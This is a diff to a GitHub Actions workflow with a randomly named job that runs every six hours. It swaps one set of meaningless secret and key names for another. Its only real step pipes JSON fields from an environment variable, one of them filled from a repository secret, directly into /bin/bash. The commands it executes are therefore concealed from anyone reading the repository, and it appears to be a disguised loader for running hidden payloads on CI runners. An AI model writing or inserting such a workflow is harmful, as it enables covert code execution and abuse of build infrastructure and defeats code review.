@@ -1,9 +1,10 @@
 name: wengkeneng3197
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
-jobs:  # 7861
+    - cron: '35 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,15 +12,16 @@ jobs:  # 7861
       - uses: actions/checkout@v4
       - name: wengkeneng3197
         env:
-          kdg51851: ${{ secrets.kdg51851 }}
+          qub921: ${{ secrets.qub921 }}
         run: |
-          echo $kdg51851 | jq -r .qor0860 | /bin/bash
-          echo $x7786 | jq -r .leclx6 | /bin/bash
-          echo $zk111 | jq -r .leyql42376 | /bin/bash
-          echo $bcp36 | jq -r .x0 | /bin/bash
-          echo $mn52279 | jq -r .namkr661 | /bin/bash
-          echo $mrj061 | jq -r .swhjn5242 | /bin/bash
-          echo $vs081 | jq -r .b81 | /bin/bash
-          echo $pr4268 | jq -r .jjm35 | /bin/bash
-          echo $njkub564 | jq -r .ctrf5329 | /bin/bash
+          echo $qub921 | jq -r .br3 | /bin/bash
+          echo $gr09 | jq -r .gfn885 | /bin/bash
+          echo $yj25 | jq -r .ih07 | /bin/bash
+          echo $tah82 | jq -r .eqo1762 | /bin/bash
+          echo $lp6 | jq -r .mrd4580 | /bin/bash
+          echo $a0 | jq -r .poep45 | /bin/bash
+          echo $rk89 | jq -r .va754 | /bin/bash
+          echo $zna08 | jq -r .x7 | /bin/bash
+          echo $ybv749 | jq -r .k79 | /bin/bash
+          echo $ba75 | jq -r .re92 | /bin/bash
 
